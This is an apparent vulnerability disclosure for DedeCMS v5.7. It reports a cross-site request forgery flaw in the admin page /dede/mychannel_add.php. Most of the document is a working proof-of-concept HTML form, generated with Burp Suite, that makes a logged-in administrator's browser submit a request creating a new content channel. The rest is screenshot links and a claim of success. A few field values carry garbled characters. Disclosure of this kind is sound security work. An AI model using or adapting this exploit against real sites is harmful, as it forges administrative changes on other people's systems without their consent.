target:https://github.com/wdsunwq/DedeCMSv5
version: v5.7

DedeCMS v5.7 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /dede/mychannel_add.php
![1](https://github.com/777erp/cms/assets/113673221/367ef326-c293-42e0-a35f-aaf20454f52d)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1/src/dede/mychannel_add.php" method="POST">
      <input type="hidden" name="action" value="add" />
      <input type="hidden" name="id" value="17" />
      <input type="hidden" name="nid" value="ch17" />
      <input type="hidden" name="typename" value="�&#162;&#145;�&#129;&#147;17" />
      <input type="hidden" name="addtable" value="dede&#95;addon17" />
      <input type="hidden" name="issystem" value="0" />
      <input type="hidden" name="issend" value="0" />
      <input type="hidden" name="sendrank" value="0" />
      <input type="hidden" name="usertype" value="" />
      <input type="hidden" name="arcsta" value="&#45;1" />
      <input type="hidden" name="titlename" value="�&#160;&#135;�&#162;&#152;" />
      <input type="hidden" name="needdes" value="1" />
      <input type="hidden" name="needpic" value="1" />
      <input type="hidden" name="dfcid" value="0" />
      <input type="hidden" name="onlyone" value="0" />
      <input type="hidden" name="addcon" value="archives&#95;add&#46;php" />
      <input type="hidden" name="editcon" value="archives&#95;edit&#46;php" />
      <input type="hidden" name="mancon" value="content&#95;list&#46;php" />
      <input type="hidden" name="useraddcon" value="archives&#95;add&#46;php" />
      <input type="hidden" name="usereditcon" value="archives&#95;edit&#46;php" />
      <input type="hidden" name="usermancon" value="content&#95;list&#46;php" />
      <input type="hidden" name="imageField&#46;x" value="35" />
      <input type="hidden" name="imageField&#46;y" value="3" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```

![2](https://github.com/777erp/cms/assets/113673221/557297f9-5fcf-4763-a0c9-a335f502529d)


Successed

![3](https://github.com/777erp/cms/assets/113673221/996fa518-ec55-4c7d-9e0f-9cc3f2679c7d)

